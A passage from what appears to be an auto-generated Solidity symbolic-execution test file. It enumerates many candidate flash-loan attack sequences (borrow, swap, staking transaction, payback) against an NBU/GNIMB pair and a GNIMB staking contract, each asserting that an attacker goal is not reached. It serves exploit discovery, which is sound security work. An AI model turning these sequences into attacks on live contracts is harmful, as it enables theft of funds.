        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5426(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5427(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5428(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5429(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5430(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5431(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5432(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5433(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5434(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5435(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5436(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5437(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5438(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5439(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5440(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5441(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5442(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5443(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5444(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5445(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5446(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5447(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5448(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5449(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5450(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5451(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5452(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5453(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5454(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5455(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5456(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5457(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5458(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5459(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5460(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5461(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5462(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5463(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5464(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5465(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5466(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5467(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5468(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5469(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5470(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
